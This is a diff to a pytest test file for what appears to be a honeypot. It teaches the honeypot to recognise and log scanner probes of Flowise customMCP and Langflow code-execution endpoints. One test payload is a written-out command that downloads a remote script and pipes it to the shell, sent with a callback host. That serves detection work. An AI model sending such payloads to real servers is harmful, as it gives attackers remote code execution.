@@ -56,6 +56,21 @@ def last_of(path, result_prefix="code-exec-api"):
     ("/lib/terminal-xhr.php", "exec"),
     ("/icecoder/lib/terminal-xhr.php", "exec"),
     ("/editor/ide/lib/terminal-xhr.php", "exec"),
+    # The agent-framework node loader.
+    ("/api/v1/node-load-method/customMCP", "mcp"),
+    ("/api/v1/node-load-method/CUSTOMMCP", "mcp"),
+    # Same API behind a reverse proxy that mounts the app under its own
+    # name — the spelling the sweeps send alongside the bare one.
+    ("/langflow/api/v1/validate/code", "validate"),
+    ("/flowise/api/v1/node-load-method/customMCP", "mcp"),
+    ("/ai/flowise/api/v1/node-load-method/customMCP", "mcp"),
+    ("/langflow/api/fs/exec", "exec"),
+    # Public flow build: the UUID keeps it out of the exact table.
+    ("/api/v1/build_public_tmp/00000000-0000-0000-0000-000000000000/flow",
+     "validate"),
+    ("/api/v1/build/0a1b2c3d-1111-2222-3333-444455556666/flow", "validate"),
+    ("/langflow/api/v1/build_public_tmp/0a1b2c3d-0000-0000-0000-000000000000/flow",
+     "validate"),
     # Trailing slash and case are the scanner's choice, not ours.
     ("/api/fs/exec/", "exec"),
     ("/API/Templates/Preview", "template"),
@@ -68,6 +83,12 @@ def test_observed_addresses_match(path, family):
 @pytest.mark.parametrize("path", [
     "/api/fs", "/api/exec", "/api/v1/validate", "/api/templates",
     "/terminal-xhr.php", "/lib/terminal.php", "/read", "/",
+    # A mount prefix is one or two segments; deeper is not a mount.
+    "/a/b/c/api/fs/exec",
+    # Only the custom-MCP loader is this family, not every node method.
+    "/api/v1/node-load-method", "/api/v1/node-load-method/customOther",
+    # The flow-build shape needs an id that looks like one.
+    "/api/v1/build_public_tmp/nope/flow", "/api/v1/build_public_tmp//flow",
     "/api/designer/v1/file-content/extra",
 ])
 def test_neighbouring_addresses_are_not_claimed(path):
@@ -256,3 +277,83 @@ async def test_no_credential_shaped_literal_in_any_response(flux_client):
         text = (await (await flux_client.post(path, data=data)).text()).lower()
         for marker in ("password", "secret", "api_key", "apikey", "aws_", "token"):
             assert marker not in text, f"{path} response contains {marker!r}"
+
+
+# --------------------------------------------------------------------------
+# The node loader — the payload is a command line, not a snippet
+# --------------------------------------------------------------------------
+
+@pytest.mark.asyncio
+async def test_mcp_loader_records_the_command_line_it_was_asked_to_spawn(flux_client):
+    """The definition names a program and its arguments; that is the finding."""
+    resp = await flux_client.post(
+        "/flowise/api/v1/node-load-method/customMCP",
+        data=json.dumps({
+            "loadMethod": "listActions",
+            "mcpServerConfig": {
+                "command": "bash",
+                "args": ["-c", "curl http://198.51.100.9/p | sh"],
+                "env": {"CALLBACK_URL": "http://198.51.100.9", "AUTH": "x"},
+            },
+        }),
+        headers={"Content-Type": "application/json"},
+    )
+    assert resp.status == 200
+    entry = last_of(flux_client.log_path)
+    assert entry["result"] == "code-exec-api-mcp"
+    assert entry["codeExecApiCommand"] == "bash -c curl http://198.51.100.9/p | sh"
+    # The environment is where a callback host and its token are put.
+    assert entry["codeExecApiMcpEnvKeys"] == ["AUTH", "CALLBACK_URL"]
+
+
+@pytest.mark.asyncio
+async def test_mcp_config_sent_as_a_json_string_is_still_read(flux_client):
+    """Tooling sends the definition both nested and double-encoded."""
+    resp = await flux_client.post(
+        "/api/v1/node-load-method/customMCP",
+        data=json.dumps({
+            "mcpServerConfig": json.dumps({"command": "node", "args": ["-e", "x"]}),
+        }),
+        headers={"Content-Type": "application/json"},
+    )
+    assert resp.status == 200
+    assert last_of(flux_client.log_path)["codeExecApiCommand"] == "node -e x"
+
+
+@pytest.mark.asyncio
+async def test_mcp_loader_answers_with_a_tool_list(flux_client):
+    """A started server reports its tools — that is what invites the next call."""
+    resp = await flux_client.post(
+        "/api/v1/node-load-method/customMCP",
+        data=json.dumps({"mcpServerConfig": {"command": "node"}}),
+        headers={"Content-Type": "application/json"},
+    )
+    payload = await resp.json()
+    assert [tool["name"] for tool in payload] == [
+        "list_directory", "read_file", "run_command",
+    ]
+    assert all("inputSchema" in tool for tool in payload)
+
+
+def test_mcp_argument_vector_is_bounded():
+    """An argument vector is attacker-controlled, so it cannot be unbounded."""
+    line = tbenv.code_exec_api_mcp_command_line(
+        {"command": "sh", "args": [str(i) for i in range(500)]},
+    )
+    assert len(line.split(" ")) == tbenv.CODE_EXEC_API_MCP_MAX_ARGS + 1
+
+
+def test_mcp_definition_without_a_command_yields_nothing():
+    assert tbenv.code_exec_api_mcp_command_line({"args": ["-c", "id"]}) == ""
+    assert tbenv.code_exec_api_mcp_command_line({}) == ""
+
+
+@pytest.mark.asyncio
+async def test_mcp_response_carries_no_credential_shaped_literal(flux_client):
+    text = (await (await flux_client.post(
+        "/api/v1/node-load-method/customMCP",
+        data=json.dumps({"mcpServerConfig": {"command": "node"}}),
+        headers={"Content-Type": "application/json"},
+    )).text()).lower()
+    for marker in ("password", "secret", "api_key", "apikey", "aws_", "token"):
+        assert marker not in text
